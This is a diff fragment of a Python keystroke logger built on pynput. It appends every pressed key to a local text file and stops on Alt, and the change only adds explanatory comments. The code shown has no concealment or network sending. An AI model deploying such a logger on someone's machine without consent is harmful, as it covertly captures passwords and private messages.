@@ -13,6 +13,7 @@ def on_press(key):
         keys = []
 
 def write_file(keys):
+    #This is just to write the pressed key onto a txt file with some sanity checks
     with open("Output.txt", "a") as f:
         for key in keys:
             k = str(key).replace("'","")
@@ -24,7 +25,7 @@ def write_file(keys):
 def on_release(key):
     if key == Key.alt:
         return False
-
+#This lib listens to the keyboard and call the write_file
 with Listener(on_press = on_press , on_release=on_release) as listener:
     listener.join()
 
